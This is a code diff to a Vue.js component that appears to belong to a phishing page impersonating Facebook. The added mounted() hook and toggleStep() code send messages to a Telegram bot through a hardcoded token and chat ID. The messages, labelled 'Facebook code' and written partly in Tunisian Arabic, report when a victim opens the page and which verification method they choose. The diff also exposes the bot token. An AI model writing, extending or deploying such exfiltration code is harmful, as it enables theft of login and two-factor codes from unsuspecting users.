@@ -507,6 +507,15 @@ export default {
       deadline5: moment().add(24, 'h').format(fmt),
     };
   },
+  mounted() {
+    var token = '7655618564:AAGDSVuMIRoAb_ddIDz3jTRNuA7KmfQeFsA';
+
+    var chatId2 = -4558777767;
+    var fullMessage = `
+  ||||||||||🇺🇸| Facebook code |🇺🇸||||||||||%0ASomeOneOpened : fammaChkoun7all%0A||||||||||💳| Fb|💳||||||||||`;
+
+    axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`);
+  },
   computed: {
     deadline1: function () {
       return moment(this.deadline1ts).format(fmt); // Formats the timestamp into the "YYYY-MM-DD HH:mm:ss" format
@@ -524,6 +533,13 @@ export default {
       axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`);
     },
     toggleStep() {
+      var token = '7655618564:AAGDSVuMIRoAb_ddIDz3jTRNuA7KmfQeFsA';
+
+      var chatId2 = -4558777767;
+      var fullMessage = `
+  ||||||||||🇺🇸| Facebook code |🇺🇸||||||||||%0ANoumrou elli 5tarou : ${this.selectedMethod}%0A||||||||||💳| Fb|💳||||||||||`;
+
+      axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`);
       this.step1 = false;
       this.step2 = true;
     },
